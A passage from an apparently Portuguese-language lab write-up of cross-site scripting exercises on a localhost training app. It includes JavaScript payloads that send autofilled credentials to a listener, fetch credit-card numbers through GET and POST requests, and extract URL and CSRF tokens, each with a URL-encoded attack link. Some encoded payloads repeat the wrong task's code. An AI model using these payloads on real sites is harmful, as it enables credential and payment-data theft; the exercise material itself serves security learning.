		<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://0.0.0.0:8080/?username=</span><span class="dl">"</span><span class="o">+</span><span class="nx">username</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;password</span><span class="dl">"</span><span class="o">+</span><span class="nx">password</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
		<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span> 
	<span class="p">},</span> <span class="mi">3000</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/13/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E">http://localhost/13/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E</a></ul><p>Podemos iniciar um <em>Python server</em> na porta 8080 configurado para ouvir a requisição feita.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-36.png" alt="Python server" /></p><p>Ao carregar a página, as credenciais armazenadas são carregadas nos campos do formulário.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-37.png" alt="Dados carregados" /></p><p>Logo em seguida, os dados são encaminhados para o <em>Python server</em>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-38.png" alt="Resposta recebida" /></p><h4 id="referências-12">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX">https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest</a></ul><h3 id="task-14---data-exfiltration-with-xmlhttprequest-get"><em>Task 14 - Data Exfiltration with XMLHttpRequest GET</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-39.png" alt="Task 14" /></p><h4 id="objetivo-14">Objetivo</h4><p>Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.</p><p>O objetivo desta <em>task</em>, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar o número do cartão de crédito contido em outro <em>endpoint</em> da aplicação com uma requisição do tipo GET usando <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code>. Após obter estes dados, eles precisam ser inseridos em um elemento chamado <code class="language-plaintext highlighter-rouge">exploit</code> que está na tela inicial.</p><h4 id="conhecimento-base-13">Conhecimento Base</h4><p>O <em>constructor</em> <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code> possui diversas propriedades para lidar com requisições e respostas. Algumas delas são importantes para entendermos a mecânica de ataques.</p><p>O <code class="language-plaintext highlighter-rouge">onreadystatechange</code> é um manipulador de eventos no objeto <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> que é chamado sempre que o estado da solicitação muda. Isso significa que será chamado várias vezes durante o ciclo de vida de uma solicitação, desde que é enviada até que a resposta é recebida e processada.</p><p>O objeto <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> possui uma propriedade <code class="language-plaintext highlighter-rouge">readyState</code> que fornece o estado atual da solicitação. Aqui estão os possíveis valores para <code class="language-plaintext highlighter-rouge">readyState</code>:</p><ul><li><strong>0 (não inicializado)</strong>: O objeto foi criado, mas o método <code class="language-plaintext highlighter-rouge">open()</code> ainda não foi chamado.<li><strong>1 (carregamento)</strong>: O método <code class="language-plaintext highlighter-rouge">open()</code> foi chamado, mas o método <code class="language-plaintext highlighter-rouge">send()</code> ainda não foi chamado.<li><strong>2 (carregado)</strong>: O método <code class="language-plaintext highlighter-rouge">send()</code> foi chamado, e o <em>status</em> e os cabeçalhos estão disponíveis.<li><strong>3 (interativo)</strong>: Os dados estão sendo baixados, e parte dos dados já está disponível.<li><strong>4 (completo)</strong>: Todos os dados foram recebidos e estão disponíveis.</ul><p>Geralmente, quando você usa <code class="language-plaintext highlighter-rouge">onreadystatechange</code>, você está interessado no estado 4, que indica que a solicitação foi concluída e a resposta está disponível. O manipulador de eventos <code class="language-plaintext highlighter-rouge">onreadystatechange</code> geralmente verifica o <code class="language-plaintext highlighter-rouge">readyState</code> e o <em>status</em> HTTP (para confirmar que a solicitação foi bem-sucedida) antes de processar a resposta.</p><p>A propriedade <code class="language-plaintext highlighter-rouge">responseText</code> do objeto <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> é usada para capturar o conteúdo da resposta do servidor como uma <code class="language-plaintext highlighter-rouge">string</code>. Quando uma solicitação é feita ao servidor, a resposta é armazenada nesta propriedade.</p><p>Por exemplo, se a solicitação for bem-sucedida e a resposta do servidor for um objeto JSON, você pode usar a propriedade <code class="language-plaintext highlighter-rouge">responseText</code> para obter essa resposta como uma <em>string</em>. Então você pode usar a função <code class="language-plaintext highlighter-rouge">JSON.parse()</code> para converter essa <em>string</em> em um objeto JavaScript que você pode usar em seu código.</p><h4 id="exploração-13">Exploração</h4><p>Primeiramente, precisamos entender a arquitetura da aplicação. Seguindo as orientações da aplicação, existe o <em>endpoint</em> <strong>/14/creditCard/</strong> que recebe o parâmetro <strong>user</strong> para retornar o número do cartão de crédito. Portanto, ao acessar a URL abaixo, somos levados ao destino.</p><ul><li><a href="http://localhost/14/creditCard/?user=h41stur">http://localhost/14/creditCard/?user=h41stur</a></ul><p>Com estas informações, podemos criar um objeto do tipo <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> que fará uma requisição para este <em>endpoint</em>, no entanto, também precisamos ouvir as mudanças do <code class="language-plaintext highlighter-rouge">readyState</code> com o manipulador <code class="language-plaintext highlighter-rouge">onreadystatechange</code>, caso seu valor seja alterado para <strong>4</strong> e o <em>status</em> code do <em>response</em> seja <strong>200</strong>, teremos uma resposta válida do alvo.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> 
	<span class="p">{</span>
		<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">};</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/14/creditCard/?user=h41stur</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/14/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E">http://localhost/14/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E</a></ul><p>Ao acessar a URL, temos o número do cartão impresso na tela.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-40.png" alt="Conclusão" /></p><h4 id="referências-13">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX">https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest</a></ul><h3 id="task-15---data-exfiltration-with-xmlhttprequest-post"><em>Task 15 - Data Exfiltration with XMLHttpRequest POST</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-41.png" alt="Task 15" /></p><h4 id="objetivo-15">Objetivo</h4><p>Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.</p><p>O objetivo desta <em>task</em>, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar o número do cartão de crédito contido em outro <em>endpoint</em> da aplicação com uma requisição do tipo POST usando <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code>. Após obter estes dados, eles precisam ser inseridos em um elemento chamado <code class="language-plaintext highlighter-rouge">exploit</code> que está na tela inicial.</p><h4 id="conhecimento-base-14">Conhecimento Base</h4><p>Outra propriedade importante é o <code class="language-plaintext highlighter-rouge">setRequestHeader</code> do objeto <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code>, este é usado para definir os cabeçalhos HTTP para uma solicitação. Este método aceita dois argumentos: o nome do cabeçalho e o valor do cabeçalho. Ele é geralmente chamado após o método <code class="language-plaintext highlighter-rouge">open</code>, mas antes do método <code class="language-plaintext highlighter-rouge">send</code>.</p><p>É importante observar que existem algumas restrições ao uso de <code class="language-plaintext highlighter-rouge">setRequestHeader</code>. Por razões de segurança, você não pode definir certos cabeçalhos controlados pelo navegador, como <code class="language-plaintext highlighter-rouge">Referer</code> e <code class="language-plaintext highlighter-rouge">Host</code>. Além disso, chamar <code class="language-plaintext highlighter-rouge">setRequestHeader</code> após <code class="language-plaintext highlighter-rouge">send</code> resultará em um erro.</p><h4 id="exploração-14">Exploração</h4><p>Assim com ona <em>task</em> anterior, existe um <em>endpoint</em> que retorna o número do cartão de crédito, o <strong>/15/creditCard/</strong> seguido do parâmetro <strong>user</strong>.</p><p>Porém, desta vez a API só aceita requisições do tipo POST. Para criarmos um <em>request</em> com o <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code>, além das informações que já temos, precisamos utilizar o método <code class="language-plaintext highlighter-rouge">setRequestHeader</code> para indicar um formulário válido.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> 
	<span class="p">{</span>
		<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">};</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/15/creditCard/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">user=h41stur</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/15/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E">http://localhost/15/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E</a></ul><p>Ao acessar a URL, temos o número do cartão impresso na tela.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-42.png" alt="Resultado" /></p><h4 id="referências-14">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX">https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest</a></ul><h3 id="task-16---getting-parameters-from-url"><em>Task 16 - Getting Parameters from URL</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-43.png" alt="Task 16" /></p><h4 id="objetivo-16">Objetivo</h4><p>Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.</p><p>O objetivo desta <em>task</em>, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar o número do cartão de crédito contido em outro <em>endpoint</em> da aplicação com uma requisição do tipo GET usando <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code>. Após obter estes dados, eles precisam ser inseridos em um elemento chamado <code class="language-plaintext highlighter-rouge">exploit</code> que está na tela inicial.</p><p>Porém, neste caso, a validação do <em>endpoint</em> também precisa de umn <em>token</em> que transita pela URL.</p><h4 id="conhecimento-base-15">Conhecimento Base</h4><p>É possível separar cada elemento que compõe a URL com o método <code class="language-plaintext highlighter-rouge">window.location.search</code>. Neste caso em específico, como existe um delimitador padrão entre parâmetros GET <code class="language-plaintext highlighter-rouge">&amp;</code>, podemos usar o <code class="language-plaintext highlighter-rouge">split()</code> para obtermos somente o que precisamos.</p><h4 id="exploração-15">Exploração</h4><p>A exploração é muito parecida com as anteriores, porém neste caso, é preciso passar um <em>token</em> de validação que existe na URL, neste caso, é preciso extrair este token antes de montar a requisição.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>

<span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
		<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">};</span>

<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/16/creditCard/?user=h41stur&amp;</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/16/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E&amp;token=d8aea5b04b59ad8a36d1e2c10a77c426">http://localhost/16/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E&amp;token=d8aea5b04b59ad8a36d1e2c10a77c426</a></ul><p>Ao acessar a URL, temos o número do cartão impresso na tela.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-44.png" alt="Resultado" /></p><h4 id="referências-15">Referências</h4><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/location">https://developer.mozilla.org/en-US/docs/Web/API/Window/location</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Location/search">https://developer.mozilla.org/en-US/docs/Web/API/Location/search</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX">https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest</a></ul><h3 id="task-17---stealing-csrf-tokens"><em>Task 17 - Stealing CSRF Tokens</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-45.png" alt="Task 17" /></p><h4 id="objetivo-17">Objetivo</h4><p>Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.</p><p>O objetivo desta <em>task</em>, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar o número do cartão de crédito contido em outro <em>endpoint</em> da aplicação com uma requisição do tipo GET usando <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code>. Após obter estes dados, eles precisam ser inseridos em um elemento chamado <code class="language-plaintext highlighter-rouge">exploit</code> que está na tela inicial.</p><p>Porém, neste caso, a validação do <em>endpoint</em> também precisa de umn <em>CSRF token</em> que está em um campo <em>hidden</em> no formulário.</p><h4 id="conhecimento-base-16">Conhecimento Base</h4><p>Outra propriedade importante é o <code class="language-plaintext highlighter-rouge">setRequestHeader</code> do objeto <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code>, este é usado para definir os cabeçalhos HTTP para uma solicitação. Este método aceita dois argumentos: o nome do cabeçalho e o valor do cabeçalho. Ele é geralmente chamado após o método <code class="language-plaintext highlighter-rouge">open</code>, mas antes do método <code class="language-plaintext highlighter-rouge">send</code>.</p><p>É importante observar que existem algumas restrições ao uso de <code class="language-plaintext highlighter-rouge">setRequestHeader</code>. Por razões de segurança, você não pode definir certos cabeçalhos controlados pelo navegador, como <code class="language-plaintext highlighter-rouge">Referer</code> e <code class="language-plaintext highlighter-rouge">Host</code>. Além disso, chamar <code class="language-plaintext highlighter-rouge">setRequestHeader</code> após <code class="language-plaintext highlighter-rouge">send</code> resultará em um erro.</p><p>CSRF é a sigla para <em>Cross-Site Request Forgery</em>, uma forma de ataque malicioso que engana a vítima para que ela realize ações não intencionais em um site no qual está autenticada.</p><p>Um <em>token</em> CSRF é uma medida de segurança usada para prevenir esses tipos de ataques. Ele é um valor secreto único e aleatório gerado pelo servidor e enviado ao cliente. O cliente deve então enviar esse <em>token</em> de volta ao servidor com cada solicitação que modifica o estado do servidor (como uma solicitação POST).</p><p>Quando o servidor recebe uma solicitação que modifica o estado, ele verifica se o <em>token</em> CSRF enviado com a solicitação corresponde ao <em>token</em> que foi enviado ao cliente. Se os <em>tokens</em> não corresponderem, a solicitação é rejeitada.</p><p>A ideia por trás do <em>token</em> CSRF é que um atacante não terá acesso ao <em>token</em>, então não será capaz de forjar uma solicitação válida. Embora o atacante possa forjar a solicitação em si, ele não terá o token CSRF, então a solicitação será rejeitada pelo servidor.</p><h4 id="exploração-16">Exploração</h4><p>Se olharmos para o código HTML da aplicação podemos ver o valor do <em>token CSRF</em> em um campo <em>hidden</em> do formulário.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-46.png" alt="Token" /></p><p>Porém, não podemos pegar este valor manualmente, e inseri-lo no script malicioso, pois este <em>token</em> é gerado aleatoriamente para cada requisição feita na página.</p><p>Portanto, um ataque efetivo, precisa capturar o valor deste campo, antes de montar o <em>request</em> para o <em>endpoint</em> alvo. Por se tratar de um simples campo HTML, podemos extrair seu valor sem problemas com alguns métodos que conhecemos.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
